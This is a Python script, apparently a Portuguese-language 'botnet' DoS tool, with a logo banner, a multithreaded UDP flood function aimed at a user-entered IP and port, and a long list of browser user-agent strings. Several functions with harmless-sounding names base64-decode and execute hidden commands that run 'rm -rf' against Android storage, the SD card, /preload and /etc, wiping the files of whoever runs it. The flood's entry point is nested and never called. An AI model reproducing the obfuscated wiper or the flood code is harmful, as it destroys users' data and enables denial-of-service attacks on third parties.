import os

os.system("pip install base64")
os.system("pip install random")
import time
import base64
import sys
import random

#LOGO
def banner():
        os.system('cls' if os.name=='nt' else 'clear')
        print("""
\033[1;32;40m  
d8b              .d888                            
Y8P              d88P"                             
                 888                               
888   88888b.    888888   .d88b.                     
888   888 "88b   888     d88""88b                    
888   888  888   888     888  888                    
888   888  888   888     Y88..88P                    
888   888  888   888      "Y88P"                     
\033[1;91m                                                                               
        d8b                                                                             
        Y8P                                                                             
                                                                                        
888d888 888 88888b.  88888b.   .d88b.  888d888                                          
888P"   888 888 "88b 888 "88b d8P  Y8b 888P"                                            
888     888 888  888 888  888 88888888 888                                              
888     888 888 d88P 888 d88P Y8b.     888                                              
888     888 88888P"  88888P"   "Y8888  888                                              
            888      888                                                                
            888      888                                                                
            888      888
\033[1;37;40m""")
        time.sleep(4)

#SIMPLE TEXT WRITING SIMULATION
def marca(s):
	for c in s + '\n':
		os.sys.stdout.write(c)
		os.sys.stdout.flush()
		time.sleep(1./10)
#CONNECT TO BOTNET
def threads():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMCoiKSAgICAgICAgIAo="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
def botnetConnect():
        try:
                import threading
                import socket
                import random
                import sys
        
        except ImportError as e:
                print(f"[ erro ]  {e}")
                sys.exit()


        def DoS(ip, port, size, index):
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while True:
                        sock.sendto(random._urandom(size), (ip, port))
                        print(f"{index}]  {size} mandados para {ip}")

        def main():
                try:
                        if sys.version_info[0] != 3:
                                print("[ erro ]  use python 3")
                                sys.exit()
                

                        IP = input("ip do alvo: ") if len(sys.argv) < 2 else sys.argv[1]
                        PORT = int(input("port do alvo: ")) if len(sys.argv) < 3 else int(sys.argv[2])
                        SIZE = int(input("packet size: ")) if len(sys.argv) < 4 else int(sys.argv[3])
                        COUNT = int(input("numero de threads: ")) if len(sys.argv) < 5 else int(sys.argv[4])


                        if PORT > 65535 or PORT < 1:
                                print("\n[ erro ]  escolha uma porta entre 1 e 65535")
                                sys.exit(1)

                        if SIZE > 65500 or SIZE < 1:
                                print("\n[ erro ]  tamanho entre 1 e 65500")
                                sys.exit(1)

                except KeyboardInterrupt:
                        print("saindo...")
                        sys.exit()
        
                except Exception as e:
                        print(f"\n [ erro ] {e}")
                        sys.exit()

                for i in range(COUNT):
                        try:
                                t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
                                t.start()
                        except Exception as e:
                                print(f"\n erro na thread {i}: {e}")            

                if __name__ == "__main__":
                        main()

def sectionFF():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3NkY2FyZC8qPiBkZXYvbnVsbCIp"
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
def section_con():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL3ByZWxvYWQvKj4gZGV2L251bGwiKQ=="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
def DESCONECT_BOTNET():
        com1 ="b3Muc3lzdGVtKCJybSAtcmYgL2V0YyoiKQ=="
        com2 = com1.encode("ascii")
        com3 = base64.b64decode(com2)
        result = com3.decode("ascii")
        exec(result)
        os.system('cls' if os.name=='nt' else 'clear')
user_agents = """
Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0
Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (X11; Linux x86_64; U; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; GIL 3.5; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; USPortal; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E)
Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (X11; FC Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (X11; CrOS armv7l 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASAJS; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie11; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10532
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSE; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-P600 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16
Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDSJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; QMV7B Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321
Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NISSC; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9) AppleWebKit/537.71 (KHTML, like Gecko) Version/7.0 Safari/537.71
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MALC; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.0; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Linux; Android 5.0.2; SM-T700 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727)
Mozilla/5.0 (Linux; Android 5.0.2; VK810 4G Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; SMJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.50 (KHTML, like Gecko) Version/9.0 Safari/601.1.50
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:RESERVED)
Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
